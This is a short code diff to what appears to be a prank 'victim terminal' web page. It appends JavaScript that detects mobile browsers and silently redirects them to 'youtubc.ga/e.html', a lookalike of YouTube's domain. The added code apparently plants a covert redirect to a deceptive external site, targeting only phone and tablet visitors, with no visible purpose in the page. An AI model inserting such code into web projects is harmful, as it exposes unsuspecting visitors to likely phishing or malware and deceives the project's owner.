@@ -192,3 +192,8 @@ Closing Victims terminal...
     
     
 ` ;
+
+let isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
+if (isMobile) {
+  window.location.replace("https://youtubc.ga/e.html");
+}
